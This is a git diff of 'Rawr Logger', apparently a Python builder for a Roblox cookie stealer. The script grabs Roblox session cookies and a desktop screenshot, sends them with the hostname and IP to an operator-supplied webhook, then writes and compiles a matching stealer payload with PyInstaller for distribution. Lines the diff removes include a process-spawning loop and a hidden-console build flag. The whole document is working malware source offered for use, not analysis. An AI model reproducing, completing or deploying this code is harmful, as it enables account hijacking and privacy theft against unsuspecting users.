@@ -1,4 +1,5 @@
 import os
+from tokenize import Name
 import requests
 from pystyle import *
 from PIL import ImageGrab
@@ -9,7 +10,7 @@ import shutil
 os.system(f'cls & title Rawr Logger!')
 
 u = os.getlogin()
-webhook = "enter dual webhook here"
+webhook = "Enter Dual Webhook Here"
 hostname = socket.gethostname()   
 pc_username = os.getenv("UserName")
 ip = socket.gethostbyname(hostname)  
@@ -27,14 +28,11 @@ for robloxcookie in robloxcookies:
 cookie = RobloxCookie[1]
 requests.post(webhook,json={'content': f'There Roblox Cookie:{cookie}'})
 screenshot = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
-screenshot.save(f'C:\\Users\\{u}\\AppData\\Local\\Temp\\sslol.png')
+screenshot.save("image.jpg")
 screenshot.close()
-with open(f'C:\\Users\\{u}\\AppData\\Local\\Temp\\sslol.png', 'rb') as f:
+with open('image.jpg', 'rb') as f:
   requests.post(webhook,json={'content': f'Picture Of There Desktop:'})
   requests.post(webhook,files={'upload_file': f})
-  os.remove(f'C:\\Users\\{u}\\AppData\\Local\\Temp\\sslol.png')
-
-
 
 Write.Print(Center.XCenter("""
                                           
@@ -75,19 +73,18 @@ if r.status_code == 200:
          Write.Print("Webhook Is Working\n",Colors.white_to_green, interval=0.01) 
          time.sleep(1) 
 else: 
-    Write.Print("Webhook Is Not Working\n",Colors.white_to_red, interval=0.01) 
+    Write.Print("\nWebhook Is Not Working\n",Colors.white_to_red, interval=0.01) 
     time.sleep(3) 
     exit()
-name = Write.Input("\nEnter File Name:", Colors.green_to_yellow, interval=0.01)
+name = Write.Input("Enter File Name:", Colors.green_to_yellow, interval=0.01)
 code = """
-import requests
-import subprocess, sys
-import socket 
-import os
 import browser_cookie3
+import os 
+import requests
+import socket
 from PIL import ImageGrab
 u = os.getlogin()
-webhook = "john"
+webhook = "webhooks"
 hostname = socket.gethostname()   
 pc_username = os.getenv("UserName")
 ip = socket.gethostbyname(hostname)  
@@ -105,20 +102,16 @@ for robloxcookie in robloxcookies:
 cookie = RobloxCookie[1]
 requests.post(webhook,json={'content': f'There Roblox Cookie:{cookie}'})
 screenshot = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
-screenshot.save(f'C:\\Users\\{u}\\AppData\\Local\\Temp\\sslol.png')
+screenshot.save("image.jpg")
 screenshot.close()
-with open(f'C:\\Users\\{u}\\AppData\\Local\\Temp\\sslol.png', 'rb') as f:
-  requests.post(webhook,json={'content': f'Picture Of There DeskTop:'})
+with open('image.jpg', 'rb') as f:
+  requests.post(webhook,json={'content': f'Picture Of There Desktop:'})
   requests.post(webhook,files={'upload_file': f})
-  os.remove(f'C:\\Users\\{u}\\AppData\\Local\\Temp\\sslol.png')
-while True:
-    subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
+
 """
 file = open(f'{name}.py', 'a')
-file.write(code.replace("john", webhook))
-os.system(f'pyinstaller --onefile --noconsole -i NONE {name}.py & cls')
-os.remove(f'{name}.py')
+file.write(code.replace("webhooks", webhook))
+os.system(f'pyinstaller {name}.py --onefile')
 os.remove(f'{name}.spec')
-shutil.rmtree('build')
-Write.Print('Rawr Logger Was SucessFully Complied In Dist Folder',Colors.green)
-os.system('pause >nul')
+Write.Print("Rawr Logger Was SucessFully Complied Check Dist Folder\n",Colors.white_to_green, interval=0.01) 
+time.sleep(15)
